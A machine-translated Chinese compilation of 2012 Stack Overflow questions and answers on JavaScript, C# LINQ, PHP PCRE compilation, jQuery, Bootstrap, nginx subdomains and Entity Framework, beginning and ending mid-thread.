    initAutocomplete : function(url, destinationElement){
            alert("old");
    },
} 
```

有人建议，但这不起作用我认为它是 jQuery 吗？

```
$.extend(obj_name.prototype, {
    newfoo : function() { alert('hi #3'); }
} 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-27T00:59:47.983

这篇文章应该有所帮助： http: [//prototypejs.org/learn/class-inheritance](http://prototypejs.org/learn/class-inheritance)

看起来您正在以“旧”方式定义您的类，如该页面上的第一个示例中所述。你用的是1.7吗？

假设您使用的是 1.7，如果您想覆盖或添加方法到您的类，您可以使用[Class.addMethods](http://api.prototypejs.org/language/Class/prototype/addMethods/)：

```
Varien.searchForm.addMethods({
  initAutocomplete: function(url, destinationElement) {
    // Your new implementation
    // This will override what was previously defined
    alert('new');
  },
  someNewMethod: function() {
    // This will add a new method, `someNewMethod`
    alert('someNewMethod');
  }
}); 
```

这是一个小提琴：http: [//jsfiddle.net/gqWDC/](http://jsfiddle.net/gqWDC/)

# java - 奇怪的java线程转储输出

> ID：10338229
> 
> 赞同：0
> 
> 时间：2012-04-26T17:15:46.860
> 
> 标签：java, thread-dump

我有一个 java 进程的线程转储（kill -3 输出），我看到一个奇怪的问题 - 我看到有很多线程被阻塞，因为它们正在等待锁定一个对象，但我没有看到任何线程持有这个锁：

> grep 0x00002aab9e9454a0 输出文件 | 排序 | 唯一的-c

```
 86         - waiting to lock <0x00002aab9e9454a0> (a java.util.Vector) 
```

（它是 86 次，因为那里有多个转储，但这与这个问题无关）。

任何人都知道这样的事情怎么会发生？

谢谢！

# c# - 如何在 C# 中将项目添加到 linq 选择新命令的结果中？

> ID：10338231
> 
> 赞同：1
> 
> 时间：2012-04-26T17:15:48.323
> 
> 标签：c#, linq

在使用 linq 的 C# 中，我有一个类似的查询：

```
var result = from p in cart select new { p.Product.Title, p.Product.Price }; 
```

现在我想添加一些其他项目来产生结果。例如添加：

```
int weight;
string message; 
```

这样我就可以拥有类似的东西：

```
foreach( var r in result)
{
   dosomething(r.weight;)
   dosomething(r.message);
   dosomething(r.title);
   dosomething(r.price);
  } 
```

是否可以？我该怎么做？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-26T17:19:23.887

您需要创建新项目。你能做这样的事情吗？

```
var result = from p in cart select new { Title = p.Product.Title,
                                         Price = p.Product.Price,
                                         Weight = 0,
                                         Message = null }; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-26T17:19:38.490

**选择新的创建匿名类型**，以便在创建后无法添加属性，但您可以做的一件事是创建自己的类型并在查询中分配属性值，然后再分配其他属性值。

```
//your class will be 
class MyClass
{
     float weight {get;set;}
     string Title {get;set;}
     float price {get;set;}
     string message {get;set;} 
}

   //select new will be     
    select new MyClass
    {
        Title =  p.Product.Title,
        price =  p.Product.Price,
        weight = 0,
        message = string.empty
    } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T17:19:35.557

你不能那样做。匿名类型是普通类型，它们在编译时是固定的。您以后无法更改它们。

编辑：您可以为您的结果集创建一个容器类，然后根据它进行选择：class MyResult

```
class MyResult
{
    public string Title { get; set; }
    public double Price { get; set; }
    public double Weight { get; set; }
    public string Message { get; set; }
} 
```

然后你可以使用：

```
 var query = from t in cart
                select new MyResult
                {
                    Title = t.ProductTitle,
                    Price = t.Product.Price
                }; 
```

以后你可以这样做：

```
foreach( var r in result)
{
   dosomething(r.Wight;)
   dosomething(r.Message);
   dosomething(r.Title);
   dosomething(r.Price);
  } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T17:20:11.377

您可以执行以下操作：

```
var result = from p in cart select new { p.Product.Title, p.Product.Price, Weight = 55, Message ="message" }; 
```

# php - PHP 5.4 安装后：preg_match()：编译失败：未知选项位设置在偏移量 0

> ID：10338234
> 
> 赞同：7
> 
> 时间：2012-04-26T17:16:04.467
> 
> 标签：php, codeigniter, pcre

我最近在我的 Lion OS X 64 位上将我的 PHP 升级到了 5.4.1 版，我在 Codeigniter 中遇到了一个错误：

```
Severity: Warning

Message: preg_match(): Compilation failed: unknown option bit(s) set at offset 0

Filename: core/Utf8.php

Line Number: 44 
```

我用谷歌搜索了这个问题，这似乎是 PHP 中的 PCRE 库的问题，我按照[这个教程](http://www.hirmet.com/mac-os-x-lion-upgrade-to-php-5-4)显示了使用自制软件安装 pcre（我正在运行 pcre 8.30），但这并没有解决问题。

我已经尝试四处寻找解决方案，但我没有遇到一个有帮助的解决方案 - 有没有解决这个 PCRE lib 问题的方法？

编辑：刚刚编辑了这个问题来提醒我我的安装是什么：

```
./configure \
--prefix=/usr \
--mandir=/usr/share/man \
--infodir=/usr/share/info \
--sysconfdir=/private/etc \
--with-apxs2=/usr/sbin/apxs \
--enable-cli \
--with-config-file-path=/etc \
--with-libxml-dir=/usr \
--with-openssl=/usr \
--with-kerberos=/usr \
--with-zlib=/usr \
--enable-bcmath \
--with-bz2=/usr \
--enable-calendar \
--with-curl=/usr \
--enable-dba \
--enable-exif \
--enable-ftp \
--with-gd \
--with-freetype-dir=/usr/X11/ \
--with-jpeg-dir=/usr \
--with-png-dir=/usr/X11/ \
--enable-gd-native-ttf \
--with-icu-dir=/usr \
--with-iodbc=/usr \
--with-ldap=/usr \
--with-ldap-sasl=/usr \
--with-libedit=/usr \
--enable-mbstring \
--enable-mbregex \
--with-mysql=mysqlnd \
--with-mysqli=mysqlnd \
--with-pdo-mysql=mysqlnd \
--with-mysql-sock=/var/mysql/mysql.sock \
--with-readline=/usr \
--enable-shmop \
--with-snmp=/usr \
--enable-soap \
--enable-sockets \
--enable-sysvmsg \
--enable-sysvsem \
--enable-sysvshm \
--with-tidy \
--enable-wddx \
--with-xmlrpc \
--with-iconv-dir=/usr \
--with-xsl=/usr \
--enable-zip \
--with-pgsql=/usr \
--with-pdo-pgsql=/usr \
--with-mcrypt=/usr/local/lib 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-29T21:14:08.767

我能够让 PHP 5.4.1 与 PCRE 版本 8.12 一起工作（我相信这是 PHP 5.4.1 中包含的版本）。在问题的评论中列出了所有来回之后，我决定在没有 PCRE 标志的情况下编译 PHP，让 PHP 只使用它的默认值。通过使用默认值，它与 8.12 一起编译。

现在，后续问题当然是为什么会发生这种情况。我仍然希望使用我提供的标志使用 PHP 编译 8.30。但是，在这一点上，我很高兴这件事能正常工作。

以下是我必须使用的配置选项，以防您想从头开始尝试。

```
./configure \
--prefix=/usr \
--mandir=/usr/share/man \
--infodir=/usr/share/info \
--sysconfdir=/private/etc \
--with-apxs2=/usr/local/apache/bin/apxs \
--enable-cli \
--with-config-file-path=/etc \
--with-libxml-dir=/usr \
--with-openssl=/usr \
--with-kerberos=/usr \
--with-zlib=/usr \
--enable-bcmath \
--with-bz2=/usr \
--enable-calendar \
--with-curl=/usr \
--enable-dba \
--enable-exif \
--enable-ftp \
--with-gd \
--with-freetype-dir=/usr/X11/ \
--with-jpeg-dir=/usr \
--with-png-dir=/usr/X11/ \
--enable-gd-native-ttf \
--with-icu-dir=/usr \
--with-iodbc=/usr \
--with-ldap=/usr \
--with-ldap-sasl=/usr \
--with-libedit=/usr \
--enable-mbstring \
--enable-mbregex \
--with-mysql=mysqlnd \
--with-mysqli=mysqlnd \
--with-pdo-mysql=mysqlnd \
--with-mysql-sock=/var/mysql/mysql.sock \
--with-readline=/usr \
--enable-shmop \
--with-snmp=/usr \
--enable-soap \
--enable-sockets \
--enable-sysvmsg \
--enable-sysvsem \
--enable-sysvshm \
--with-tidy \
--enable-wddx \
--with-xmlrpc \
--with-iconv-dir=/usr \
--with-xsl=/usr \
--enable-zip \
--with-pgsql=/usr \
--with-pdo-pgsql=/usr \
--with-mcrypt=/usr 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-19T01:36:10.310

我通过在我的 Linux 机器上使用更新 PHP 和 PCRE 解决了这个问题`yum update`。

PHP 已更新到版本 5.3.17，PCRE 已更新到版本 8.21-5.3amzn1（我在 Amazon EC2 实例上运行）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-10T20:33:38.237

重新编译httpd。在此之前，请确保您的系统上只有一个版本的 pcre。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-27T17:27:12.747

我的解决方案接近@bigZero 的建议。

我无法使其在 brew 上运行，因为当我尝试在 brew 上安装 pcre v8.12 时，这是不可能的，因为它（可能）已从存储库中删除。我的意思是，它显示在`brew versions pcre`但是当我尝试安装它时无法从[ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/ 下载](ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/)

所以我不得不从[http://www.pcre.org](http://www.pcre.org)下载 pcre 8.12 源代码，编译并安装它。我使用了以下配置：`./configure --prefix=/usr --enable-utf8 --enable-unicode-properties`

我尝试在没有`--with-pcre-regex`选项的情况下重新编译 php（在我的情况下为 5.4.10）（如 @scott-harwell 所建议的那样。但编译时失败了。比我添加`--with-pcre-regex=/usr/`的结果，它终于奏效了。

# javascript - javascript - 读取本地文本文件 - 字符集问题

> ID：10338235
> 
> 赞同：2
> 
> 时间：2012-04-26T17:16:04.557
> 
> 标签：javascript, file, encoding, filereader

我正在使用输入类型文件和 FileReader.readAsText() 读取本地文本文件。当本地文本文件包含像**Ü**这样的字符时，就会出现问题。在这种情况下，它被转换为**ï¿**。当然，我可以手动将编码设置为**iso8859-1**作为 FileReader.readAsText(File, encoding) 的参数，但问题是我不知道用户设置了什么样的编码。

我的问题是是否有一个选项来确定客户端机器上的编码？

最好的问候 kkris1983

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:29:26.270

您需要分析文本文件的原始二进制文件以最好地猜测编码是什么。javascript AFAIK 中没有为此的任何库，但您可以从其他语言移植一个。

由于这不是很健壮，因此您还应该提供手动覆盖，例如`Characters not showing correctly? Change encoding:`

如果您检测到它是西方 Windows 机器，您还可以使用智能默认值，例如 ISO-8859-1。

# jquery - 数据表：实时排序

> ID：10338236
> 
> 赞同：1
> 
> 时间：2012-04-26T17:16:26.033
> 
> 标签：jquery, datatables

我正在使用不使用 ajax 的数据表，并且我需要能够在列被客户端更改时重新排序。这可能吗？该表有很多输入，加载表时排序工作正常，但是当这些输入值从浏览器更改时，排序不会解释新值（它只是继续排序“认为”旧值仍然存在） ... 有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-11T11:24:49.303

在[http://www.datatables.net/ref](http://www.datatables.net/ref)我找到了 Parameter `fnDraw`。

这可能有助于解释新值。

如果它没有帮助，请在[http://jsfiddle.net/](http://jsfiddle.net/)创建一个显示您的代码的示例。

# objective-c - 复选框选中问题

> ID：10338244
> 
> 赞同：1
> 
> 时间：2012-04-26T17:16:46.663
> 
> 标签：objective-c, ipad

我正在处理 ipad 中的复选框。我想禁用复选框，默认情况下它被选中。

```
[checkboxButton1 setSelected:TRUE];
[checkboxButton1 setEnabled:FALSE]; 
```

如果我使用上面的代码，复选框将被禁用，但默认情况下未选中。

非常感谢任何帮助

提前致谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T18:02:49.237

A`UISwitch`有一个`on`属性。Cocoa Touch 中没有复选框。

# javascript - 为什么滚动条不起作用？

> ID：10338246
> 
> 赞同：0
> 
> 时间：2012-04-26T17:16:48.040
> 
> 标签：javascript, jquery, jquery-tools

我正在尝试使用[jQuery Tools](http://jquerytools.org/) Scrollable，我之前已经使用过很多次，但现在它似乎不起作用，我不知道为什么。

这是我正在使用的网站，如果需要，我可以在这里粘贴代码，但我相信你可以在控制台中查看源代码，所有内容都是纯 HTML、CSS 和 JavaScript / jQuery：[http： //rolandgroza.com/projects/tcsg/](http://rolandgroza.com/projects/tcsg/)

这是HTML结构：

```
<section class="galleries-wrapper">
    <div class="paper-stack-wrapper">
        <div class="header-wrapper">
            <h2>Featured Galleries</h2>
        </div>
        <div class="content-wrapper scrollable vertical">
            <div class="items">
                <div class="item">
                    <ul class="css-galleries-list">
                        <li>
                            <span class="css-gallerie-logo"><a href="#"><img src="assets/gfx/awwwards.jpg"></a></span>
                            <span class="css-gallerie-name"><a href="#">awwwards</a></span>
                            <span class="css-gallerie-rank">6</span>
                            <span class="css-gallerie-sbmt"><a href="#">Submit</a></span>
                        </li>
                        <li>
                            <span class="css-gallerie-logo"><a href="#"><img src="assets/gfx/cssdesignawards.jpg"></a></span>
                            <span class="css-gallerie-name"><a href="#">cssdesignawards</a></span>
                            <span class="css-gallerie-rank">6</span>
                            <span class="css-gallerie-sbmt"><a href="#">Submit</a></span>
                        </li>
                        <li>
                            <span class="css-gallerie-logo"><a href="#"><img src="assets/gfx/csswinner.jpg"></a></span>
                            <span class="css-gallerie-name"><a href="#">csswinner</a></span>
                            <span class="css-gallerie-rank">4</span>
                            <span class="css-gallerie-sbmt"><a href="#">Submit</a></span>
                        </li>
                        <li>
                            <span class="css-gallerie-logo"><a href="#"><img src="assets/gfx/divinecss.jpg"></a></span>
                            <span class="css-gallerie-name"><a href="#">divinecss</a></span>
                            <span class="css-gallerie-rank">5</span>
                            <span class="css-gallerie-sbmt"><a href="#">Submit</a></span>
                        </li>
                        <li>
                            <span class="css-gallerie-logo"><a href="#"><img src="assets/gfx/pagecrush.jpg"></a></span>
                            <span class="css-gallerie-name"><a href="#">pagecrush</a></span>
                            <span class="css-gallerie-rank">3</span>
                            <span class="css-gallerie-sbmt"><a href="#">Submit</a></span>
                        </li>
                    </ul>
                </div>
                <div class="item">
                    <ul class="css-galleries-list">
                        <li>
                            <span class="css-gallerie-logo"><a href="#"><img src="assets/gfx/awwwards.jpg"></a></span>
                            <span class="css-gallerie-name"><a href="#">awwwards</a></span>
                            <span class="css-gallerie-rank">6</span>
                            <span class="css-gallerie-sbmt"><a href="#">Submit</a></span>
                        </li>
                        <li>
                            <span class="css-gallerie-logo"><a href="#"><img src="assets/gfx/cssdesignawards.jpg"></a></span>
                            <span class="css-gallerie-name"><a href="#">cssdesignawards</a></span>
                            <span class="css-gallerie-rank">6</span>
                            <span class="css-gallerie-sbmt"><a href="#">Submit</a></span>
                        </li>
                        <li>
                            <span class="css-gallerie-logo"><a href="#"><img src="assets/gfx/csswinner.jpg"></a></span>
                            <span class="css-gallerie-name"><a href="#">csswinner</a></span>
                            <span class="css-gallerie-rank">4</span>
                            <span class="css-gallerie-sbmt"><a href="#">Submit</a></span>
                        </li>
                        <li>
                            <span class="css-gallerie-logo"><a href="#"><img src="assets/gfx/divinecss.jpg"></a></span>
                            <span class="css-gallerie-name"><a href="#">divinecss</a></span>
                            <span class="css-gallerie-rank">5</span>
                            <span class="css-gallerie-sbmt"><a href="#">Submit</a></span>
                        </li>
                        <li>
                            <span class="css-gallerie-logo"><a href="#"><img src="assets/gfx/pagecrush.jpg"></a></span>
                            <span class="css-gallerie-name"><a href="#">pagecrush</a></span>
                            <span class="css-gallerie-rank">3</span>
                            <span class="css-gallerie-sbmt"><a href="#">Submit</a></span>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
        <div class="footer-wrapper">
            <h2>Other Galleries</h2>
        </div>
    </div>
    <div class="paper-stack-shadow"></div>
    <div class="galleries-navigation">
        <ul class="nvg">
            <li class="previous-items"><a class="prev-item"><img src="assets/gfx/prev-item.png" alt="Previous" /></a></li>
            <li class="next-items"><a class="next-item"><img src="assets/gfx/next-item.png" alt="Next" /></a></li>
        </ul>
    </div>
</section> 
```

这是 LESS 样式（不是那么相关，但插件需要一些 CSS 规则）：

```
.galleries-wrapper {
    position: relative;
    float: right;
    margin-top: 50px;
    .dimensions(450px, 350px);
    .opacity(0);

    .paper-stack-wrapper {
        position: relative;
        margin: 0px auto;
        .dimensions(450px, 350px);
        .border(1px, 1px, 1px, 1px, #bbc2c8);
        .radius(5px, 5px, 5px, 5px);
        .background(@noise-dark, #f9f9f9, #f9f9f9);

        &:before {
            position: absolute;
            top: 1px;
            left: 0px;
            content: "";
            z-index: -1;
            .dimensions(448px, 350px);
            .border(1px, 1px, 1px, 1px, #bbc2c8);
            .radius(5px, 5px, 5px, 5px);
            .background(@noise-dark, #f9f9f9, #f9f9f9);
        }

        &:after {
            position: absolute;
            top: 3px;
            left: 1px;
            content: "";
            z-index: -2;
            .dimensions(446px, 350px);
            .border(1px, 1px, 1px, 1px, #bbc2c8);
            .radius(5px, 5px, 5px, 5px);
            .background(@noise-dark, #f9f9f9, #f9f9f9);
        }

        .header-wrapper {
            position: relative;
            margin: 0px auto;
            .dimensions(450px, 40px);
            .radius(5px, 5px, 0px, 0px);
            .shadow(@shadow-inset, 0px, -1px, 2px, rgba(000, 000, 000, 0.2));

            h2 {
                .font(ChunkFiveRoman, 21px, normal, normal, normal);
                .text-format(center, none, none, inherit, uppercase, normal, 40px, normal, #afafaf);
            }
        }

        .scrollable {
            position: relative;
            margin: 0px auto;
            .dimensions(450px, 269px);
            overflow: hidden;

            .items {
                position: absolute;
                height: 20000em;

                .item {
                    position: relative;
                    margin: 0px auto;
                    .dimensions(450px, 269px);

                    .css-galleries-list {
                        position: relative;
                        margin: 0px auto;
                        .dimensions(450px, 269px);
                        list-style: none;

                        li {
                            position: relative;
                            margin: 0px auto;
                            .dimensions(450px, 53px);
                            .border(1px, 0px, 0px, 0px, #bbc2c8);
                            .background(@noise-dark, #ffffff, #f6f6f6);

                            &:first-child {
                                .border(0px, 0px, 0px, 0px, #bbc2c8);
                            }

                            &:hover {
                                .background(@noise-dark, #f6f6f6, #f1f1f1);
                            }

                            .css-gallerie-logo {
                                position: relative;
                                float: left;
                                .dimensions(180px, 53px);

                                a {
                                    position: relative;
                                    margin: 0px auto;
                                    display: block;
                                    .dimensions(150px, 53px);

                                    img {
                                        position: relative;
                                        margin: 0px auto;
                                        margin-top: 11.5px;
                                        .border(1px, 1px, 1px, 1px, #000000);
                                    }
                                }
                            }

                            .css-gallerie-name {
                                position: relative;
                                float: left;
                                .dimensions(150px, 53px);

                                a {
                                    display: block;
                                    .font(ChunkFiveRoman, 14px, normal, normal, normal);
                                    .text-format(left, none, none, inherit, uppercase, normal, 53px, normal, #afafaf);
                                    .transition (all, 0.25s, ease-in-out);

                                    &:hover {
                                        .font(ChunkFiveRoman, 14px, normal, normal, normal);
                                        .text-format(left, none, none, inherit, uppercase, normal, 53px, normal, #1fbacb);
                                        .transition (all, 0.25s, ease-in-out);
                                    }
                                }
                            }

                            .css-gallerie-rank {
                                position: relative;
                                float: left;
                                display: block;
                                .dimensions(50px, 53px);
                                .font(ChunkFiveRoman, 16px, normal, normal, normal);
                                .text-format(center, none, none, inherit, uppercase, normal, 53px, normal, #82a664);

                            }

                            .css-gallerie-sbmt {
                                position: relative;
                                float: left;
                                .dimensions(50px, 53px);

                                a {
                                    #bundle > .button(55px, 22.5px, 25px,Arial, 11px, normal);
                                    position: relative;
                                    margin: 0px auto;
                                    margin-top: 15.25px;
                                }
                            }
                        }
                    }
                }
            }
        }

        .footer-wrapper {
            position: relative;
            margin: 0px auto;
            .dimensions(450px, 41px);
            .radius(0px, 0px, 5px, 5px);
            .shadow(@shadow-inset, 0px, 1px, 2px, rgba(000, 000, 000, 0.2));

            h2 {
                .font(ChunkFiveRoman, 21px, normal, normal, normal);
                .text-format(center, none, none, inherit, uppercase, normal, 40px, normal, #afafaf);
            }
        }
    }

    .paper-stack-shadow {
        position: absolute;
        top: 290px;
        .dimensions(450px, 50px);
        z-index: -5;

        &:before {
            position: absolute;
            top: 80%;
            left: 10px;
            bottom: 5px;
            width: 50%;
            max-width: 300px;
            content: "";
            z-index: -1;
            .shadow(@shadow-normal, 0px, 15px, 10px, #777777);
            .transform-rotate(-3deg);
        }
        &:after {
            position: absolute;
            top: 80%;
            right: 10px;
            bottom: 5px;
            width: 50%;
            max-width: 300px;
            content: "";
            z-index: -1;
            .shadow(@shadow-normal, 0px, 15px, 10px, #777777);
            .transform-rotate(3deg);
        }
    }

    .galleries-navigation   {
        position: absolute;
        top: 50%;
        right: -42px;
        margin-top: -40px;
        .dimensions(40px,80px);
        .border(1px, 0px, 1px, 1px, #bbc2c8);
        .background(@noise-dark, #f9f9f9, #f9f9f9);
        .radius(0px, 5px, 5px, 0px);
        .shadow(@shadow-normal,0px, 0px, 4px, rgba(0,0,0,0.1));
        z-index: -5;

        .nvg {
            position: relative; 
            margin: 0px auto;
            .dimensions(40px, 80px);
            list-style: none;

            .previous-items { 
                position: relative;
                margin: 0px auto;
                .dimensions(40px, 40px);
                .border(0px, 0px, 0px, 0px, rgba(247,247,247,1));
                display: block;

                a { 
                    position: relative;
                    margin: 0px auto;
                    .dimensions(40px, 40px);
                    display: block;
                    cursor: pointer;
                    .font (Arial, 13px, normal, normal, normal);
                    .text-format(center, none, none, inherit, none, normal, normal, normal, #6e6e6e);
                    .transition (all, 0.3s,ease-in-out);

                    img {
                        position: relative;
                        margin: 0px auto;
                        .dimensions(40px, 40px);
                        .opacity(0.8);
                        .transition (all, 0.3s,ease-in-out);
                        border: none;
                    }

                    &:hover > img {
                        .opacity(1);
                    }           
                }
            }

            .next-items {
                position: relative;
                margin: 0px auto;
                .dimensions(40px, 40px);
                .border(1px, 0px, 0px, 0px, #bbc2c8);
                display: block;

                a { 
                    position: relative;
                    margin: 0px auto;
                    .dimensions(40px, 40px);
                    display: block;
                    cursor: pointer;
                    .font (Arial, 13px, normal, normal, normal);
                    .text-format(center, none, none, inherit, none, normal, normal, normal, #6e6e6e);
                    .transition (all, 0.3s,ease-in-out);

                    img {
                        position: relative;
                        margin: 0px auto;
                        .dimensions(40px, 40px);
                        .opacity(0.6);
                        .transition (all, 0.3s,ease-in-out);
                        border: none;
                    }

                    &:hover > img {
                        .opacity(1);
                    }
                }
            }
        }
    }
} 
```

这就是我调用插件的方式：

```
var next_items = $(container.home).find('.next-item');

var prev_items = $(container.home).find('.prev-item');

$.easing.custom = function (x, t, b, c, d) {
    var s = 1.70158;
    if ((t/=d/2) < 1) return c/2*(t*t*(((s*=(1.525))+1)*t - s)) + b;
    return c/2*((t-=2)*t*(((s*=(1.525))+1)*t + s) + 2) + b;
}

$(".scrollable").scrollable({
    vertical: true,
    easing: 'custom',
    speed: 700,
    circular: false,
    next: next_items,   
    prev: prev_items,
    mousewheel: true
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T17:28:34.463

**编辑：**我删除了上面的所有内容..

此错误正在破坏您的脚本

![在此处输入图像描述](../Images/fc80cd6d6dfc01d3647039cb84657d3f.png)

# twitter-bootstrap - Twitter Bootstrap - 导航栏未在 Firefox 和 Safari 上呈现

> ID：10338249
> 
> 赞同：1
> 
> 时间：2012-04-26T17:16:59.690
> 
> 标签：twitter-bootstrap

我有这个工具栏的代码：

```
 <div class='navbar navbar-fixed-top'>
    <div class='navbar-inner'>
      <div class='container'>
        <a class='btn btn-navbar' data-target='.nav-collapse' data-toggle='collapse'>
          <span class='icon-bar'></span>
          <span class='icon-bar'></span>
          <span class='icon-bar'></span>
        </a>
        <div class='nav-collapse'>
          <ul class='nav'>
            <li class='active'>
              <a href='some_url'>My Home</a>
            </li>
            <li>
              <a href='some_url'>Option 1 </a>
            </li>
            <li>
              <a href='some_url'>Another option</a>
            </li>
            <li>
              <a href='some_url'>Another option</a>
            </li>
          </ul>
        </div>
      </div>
    </div>
  </div> 
```

它在 Chrome 上运行正常，但在 Firefox 和 Safari 上，工具栏不呈现。知道为什么它不会渲染吗？

谢谢！

# jquery - 使用 if/else 显示/隐藏带有复选框的 div

> ID：10338255
> 
> 赞同：2
> 
> 时间：2012-04-26T17:17:26.057
> 
> 标签：jquery, html, if-statement, checkbox, show-hide

对 HTML/CSS 之后的任何类型的编码都是全新的。我试着环顾四周，但我不确定如何将解决方案应用于我的具体问题。我有一个复选框列表，例如：

`<input type="checkbox" value="de-borders" /> Choose my border`

当您点击提交按钮（有 5 个复选框）时，它应该显示选中的 div。所以我有一个链接到提交的 a href 的函数。我遇到的问题是，如果用户取消选中一个框，然后再次点击提交，我需要这些框消失。

这就是我所拥有的（我得到了帮助，所以我没有完全得到它）：

```
 var show_panels =(function(){
    $("#de-options input").each(function(index, element) {
        var val = $(element).attr('value');
        if ($("#de-options input").is(":checked"))
        {
            $('#' + val).show();
        }
        else
        {
             $('#' + val).hide();
        }
      });
  }); 
```

我有“如果”的地方是问题所在。由于 .each 我不知道如何指定“查看这些复选框，如果它们被选中...”，因为我现在拥有的“$de-options”只是显示所有这些复选框，而不管我是什么已检查。

所以真的，我只需要知道“如果”该写什么。

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-26T17:34:55.113

不确定您的 HTML 看起来如何。假设它是这样的，这应该有效。

**HTML**

```
<div id="de-options">
  <input type="checkbox" value="de-borders" /> Choose First
  <input type="checkbox" value="de-borders2" /> Choose Srcond
  <input type="checkbox" value="de-borders3" /> Choose Third
</div>

<div id="de-borders"> Div One</div>
<div id="de-borders2">Div Two</div>
<div id="de-borders3">Div Three</div>

<input type="submit" value="save" /> 
```

**脚本**

$(函数(){

```
 $("input[type='submit']").click(function(e){
      e.preventDefault();

     $("#de-options input[type='checkbox']").each(function() {
       var item= $(this);
       var val = item.attr('value');
       if (item.is(":checked"))
       {
         $('#' + val).show();
       }
       else
       {
          $('#' + val).hide();
       }
    });
  });

}); 
```

这是工作示例[http://jsfiddle.net/hzpVy/15/](http://jsfiddle.net/hzpVy/15/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-26T17:27:58.143

您正在构建一个名为“val”的变量，该变量设置为“$(element).attr('value');”。在您的示例中，复选框的值是“de-borders”，因此在这种情况下，val="de-borders"... 到目前为止还不错。但是，一旦在您的 if 语句中，它就会尝试隐藏 $('#' + val) 或 $('#de-borders')。这就是说隐藏页面上ID为de-borders的元素，它不存在。

相反，将 if/else 的内容替换为： $(element).show(); 和 $(element).hide();

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-26T17:19:45.773

```
 $("#de-options input[type='checkbox']").each(function() {
        var val = $(this).val();
        if($(this).is(':checked')) {
            $('#' + val).show();
        } else {
            $('#' + val).hide();
        }
    }); 
```

# javascript - 使用 Facebook Graph API 获取 Offline_Access

> ID：10338258
> 
> 赞同：0
> 
> 时间：2012-04-26T17:17:29.480
> 
> 标签：javascript, jquery, facebook-graph-api

我发现这篇文章逐步向您展示了如何获取离线访问令牌，但我停留在最后一部分我在下面为您提供的网址中的 long_facebook_code 是什么

[https://graph.facebook.com/oauth/access_token?client_id=xxx&redirect_uri=xxx&client_secret=xxx&code=long_facebook_code](https://graph.facebook.com/oauth/access_token?client_id=xxx&redirect_uri=xxx&client_secret=xxx&code=long_facebook_code)

我了解 client_id、redirect_uri 和 client_secret 但我要输入什么代码？

文章在这里[http://webddr.net/tips-and-tricks/facebook-offline-access-step-by-step-explanation/](http://webddr.net/tips-and-tricks/facebook-offline-access-step-by-step-explanation/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T18:52:51.027

不要花时间了解更多关于offline_access 权限的信息，
因为Facebook 已宣布删除此权限方法。

[https://developers.facebook.com/roadmap/offline-access-removal/](https://developers.facebook.com/roadmap/offline-access-removal/)

所有 access_token 将在 60 天后过期。

# ruby-on-rails - 使用 capistrano 将带有子域的 Rails 部署到 nginx/unicorn 设置——如何？

> ID：10338265
> 
> 赞同：1
> 
> 时间：2012-04-26T17:17:48.837
> 
> 标签：ruby-on-rails, deployment, nginx, subdomain, unicorn

我一直在关注 Ryan B 的 VPS 部署 railscast：

[http://railscasts.com/episodes/335-deploying-to-a-vps](http://railscasts.com/episodes/335-deploying-to-a-vps)

他建议使用的 nginx.conf 文件不适用于子域。这是他展示的：

```
upstream unicorn {
  server unix:/tmp/unicorn.blog.sock fail_timeout=0;
}

server {
  listen 80 default deferred;
  # server_name example.com;
  root /home/deployer/apps/<app name>/current/public;

  location ^~ /assets/ {
    gzip_static on;
    expires max;
    add_header Cache-Control public;
  }

  try_files $uri/index.html $uri @unicorn;
  location @unicorn {
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header Host $http_host;
    proxy_redirect off;
    proxy_pass http://unicorn;
  }

  error_page 500 502 503 504 /500.html;
  client_max_body_size 4G;
  keepalive_timeout 10;
} 
```

有谁知道如何设置支持子域？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:22:30.467

您可以取消注释行：

`# server_name example.com;`

将 example.com 替换为您的域并添加：

`server_name example.com *.example.com;` 或者

`server_name example.com blog.example.com;`

现在所有对域和子域的请求都将进入 rails

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T11:21:25.473

事实证明（至少对于 linode.com），处理通配符子域非常简单。您只需将`*`主机添加到 A 记录。

另外，在 nginix 中，我所做的被替换了：

```
# server_name example.com; 
```

和：

```
server_name localhost; 
```

我不确定这是否需要。

我的实际问题与主机或 nginx 无关。我的情况是我在注册期间使用随机散列 URL 作为安全令牌（因此用户无法劫持现有子域），但我使用的散列类型存在问题，因此我需要对其进行修改。

我没有看到任何错误，我只是被重定向回注册页面——当哈希 URL 有问题/不匹配时，这是正确的行为。

无论如何，一旦我解决了这个问题，整个子域的事情就不是问题了。

希望这可以帮助其他使用散列 URL、子域并且通常是部署新手的人。

干杯。

# c# - 使用 Linq to Entities 获取唯一值

> ID：10338266
> 
> 赞同：2
> 
> 时间：2012-04-26T17:17:55.150
> 
> 标签：c#, linq, linq-to-entities, entity-framework-4.1

我正在使用 EF 并且有一个上下文，我可以使用 _inventoryContext.Items 从中获取 Item 对象的集合。现在，这些项目对象有一个名为 Carrier 的字符串值。假设 Items 集合中有 5 个项目，它们具有以下 Carrier 值：

```
"A", "A", "B", "C", "C" 
```

如何使用 _inventoryContext.Items 取回唯一的运营商值？

```
